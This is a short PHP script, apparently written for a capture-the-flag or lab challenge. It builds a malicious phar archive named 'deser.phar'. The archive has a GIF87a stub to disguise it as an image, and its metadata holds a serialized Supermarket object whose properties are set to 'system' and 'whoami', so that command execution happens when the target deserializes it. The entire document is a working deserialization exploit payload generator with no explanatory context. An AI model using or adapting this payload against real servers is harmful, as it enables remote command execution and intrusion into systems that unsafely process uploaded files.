<?php
require_once("./supermarket.php");

$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF87a<?php __HALT_COMPILER(); ?>");

// Sử dụng lớp đã có
$object = new Supermarket();
$object->greet = 'system';
$object->customer = 'whoami';

$phar->setMetadata($object);
$phar->stopBuffering();

echo "Set File Success";
